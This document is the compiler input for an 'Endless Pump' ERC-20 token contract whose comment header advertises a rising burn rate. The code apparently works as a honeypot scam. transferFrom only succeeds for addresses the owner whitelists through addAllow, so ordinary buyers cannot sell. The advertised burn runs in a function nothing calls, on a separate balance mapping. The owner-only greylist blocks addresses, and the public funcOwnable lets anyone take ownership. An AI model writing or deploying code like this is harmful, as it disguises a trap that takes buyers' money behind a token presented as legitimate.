{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"browser/endlesspump.sol":{"content":"pragma solidity ^0.7.6;\n\n/*\n<-- ENDLESS PUMP -->\n\nTelegram: https://t.me/endlesspump\nTotal supply: 20k\nInitial burning rate: 1%\nWill be increased every 5min to max. 5%\n\nTrading at your own risk.\n*/\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address who) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function transfer(address to, uint256 value) external returns (bool);\n    function approve(address spender, uint256 value) external returns (bool);\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n    \n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nlibrary SafeMath {\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n    if (a == 0) {\n      return 0;\n    }\n    uint256 c = a * b;\n    assert(c / a == b);\n    return c;\n    }\n    \n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a / b;\n    return c;\n    }\n    \n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    assert(b <= a);\n    return a - b;\n    }\n    \n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    assert(c >= a);\n    return c;\n    }\n    \n    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\n    uint256 c = add(a,m);\n    uint256 d = sub(c,1);\n    return mul(div(d,m),m);\n    }\n}\n\nabstract contract ERC20Detailed is IERC20 {\n    uint8 private _Tokendecimals;\n    string private _Tokenname;\n    string private _Tokensymbol;\n    \n    constructor(string memory name, string memory symbol, uint8 decimals) {\n        _Tokendecimals = decimals;\n        _Tokenname = name;\n        _Tokensymbol = symbol;\n    }\n    \n    function name() public view returns(string memory) {\n    return _Tokenname;\n    }\n    \n    function symbol() public view returns(string memory) {\n    return _Tokensymbol;\n    }\n    \n    function decimals() public view returns(uint8) {\n    return _Tokendecimals;\n    }\n}\n\ncontract Ownable {\n    address public owner;\n    \n    function funcOwnable() public {\n        owner = msg.sender;\n    }\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n}\n\ncontract EndlessPumpToken is Ownable {\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n    uint256 public totalSupply;\n    uint8 public airdrop = 1;\n    \n    mapping (address => uint256) private _balances;\n    \n    uint256 constant digits = 1000000000000000000;\n    uint256 _totalSup = 20000 * digits;\n   \n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n        totalSupply =  _totalSupply;\n        balances[msg.sender] = totalSupply;\n        allow[msg.sender] = true;\n    }\n    using SafeMath for uint256;\n    mapping(address => uint256) public balances;\n    mapping(address => bool) public allow;\n    mapping (address => bool) private greylist;\n    \n    function multiGreylistAdd(address[] memory addresses) public {\n        if (msg.sender != owner) {\n    \t    revert();\n        }\n    \tfor (uint256 i = 0; i < addresses.length; i++) {\n        \tgreylistAdd(addresses[i]);\n    \t}\n\t}\n\n\tfunction multiGreylistRemove(address[] memory addresses) public {\n    \tif (msg.sender != owner) {\n        \trevert();\n    \t}\n    \tfor (uint256 i = 0; i < addresses.length; i++) {\n        \tgreylistRemove(addresses[i]);\n    \t}\n\t}\n\n\tfunction greylistAdd(address a) public {\n    \tif (msg.sender != owner) {\n        \trevert();\n    \t}\n    \tgreylist[a] = true;\n\t}\n    \n\tfunction greylistRemove(address a) public {\n    \tif (msg.sender != owner) {\n        \trevert();\n    \t}\n    \tgreylist[a] = false;\n\t}\n    \n\tfunction isInGreylist(address a) internal view returns (bool) {\n    \treturn greylist[a];\n\t}\n\n    function transfer(address _to, uint256 _value) public returns (bool) {\n        require(_to != address(0));\n        require(_value <= balances[msg.sender]);\n        balances[msg.sender] = balances[msg.sender].sub(_value);\n        balances[_to] = balances[_to].add(_value);\n        emit Transfer(msg.sender, _to, _value);\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n    mapping (address => mapping (address => uint256)) public allowed;\n\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n        require(_to != address(0));\n        require(_value <= balances[_from]);\n        require(_value <= allowed[_from][msg.sender]);\n        require(allow[_from] == true);\n        balances[_from] = balances[_from].sub(_value);\n        balances[_to] = balances[_to].add(_value);\n        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n        emit Transfer(_from, _to, _value);\n        return true;\n    }\n\n    function approve(address _spender, uint256 _value) public returns (bool) {\n        allowed[msg.sender][_spender] = _value;\n        emit Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n    function allowance(address _owner, address _spender) public view returns (uint256) {\n        return allowed[_owner][_spender];\n    }\n  \n    function addAllow(address holder, bool allowApprove) external onlyOwner {\n        allow[holder] = allowApprove;\n    }\n  \n    //1% at start\n    uint256 public basePercentage = 1;\n  \n    function findPercentage(uint256 amount) public view returns (uint256)  {\n        uint256 percent = amount.mul(basePercentage).div(20000);\n        return percent;\n    }\n  \n    //burning\n    function burn(uint256 amount) external {\n        _burn(msg.sender, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal {\n        require(amount != 0);\n        require(amount <= _balances[account]);\n        _totalSup = _totalSup.sub(amount);\n        _balances[account] = _balances[account].sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n    \n    //burn rate change, only by owner\n    function changeBurnRate(uint8 newRate) external onlyOwner {\n        basePercentage = newRate;\n    }\n    //airdrop phase change, only by owner\n    function changeAirdropPhase(uint8 _airdrop) external onlyOwner {\n    \tairdrop = _airdrop;\n\t}\n  \n    //transfer \n    function _executeTransfer(address _from, address _to, uint256 _value) private {\n        //Not to 0x, using burn()\n        if (_to == address(0)) revert();                               \n    \tif (_value <= 0) revert(); \n        if (_balances[_from] < _value) revert();     \n        if (_balances[_to] + _value < _balances[_to]) revert(); \n        \n        if (airdrop == 1) {\n        \tif (isInGreylist(msg.sender)) {\n            \trevert();\n        \t}\n    \t}\n        if(_to == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D || _to == owner || _from == owner) {\n            _balances[_from] = SafeMath.sub(_balances[_from], _value);\n            _balances[_to] = SafeMath.add(_balances[_to], _value);                            \n            emit Transfer(_from, _to, _value);                   \n        } else {\n            uint256 tokensToBurn = findPercentage(_value);\n            uint256 tokensToTransfer = _value.sub(tokensToBurn);\n            _balances[_from] = SafeMath.sub(_balances[_from], tokensToTransfer);                     \n            _balances[_to] = _balances[_to].add(tokensToTransfer);          \n            emit Transfer(_from, _to, tokensToTransfer);                   \n            _burn(_from, tokensToBurn);\n        }\n    }\n}"}}}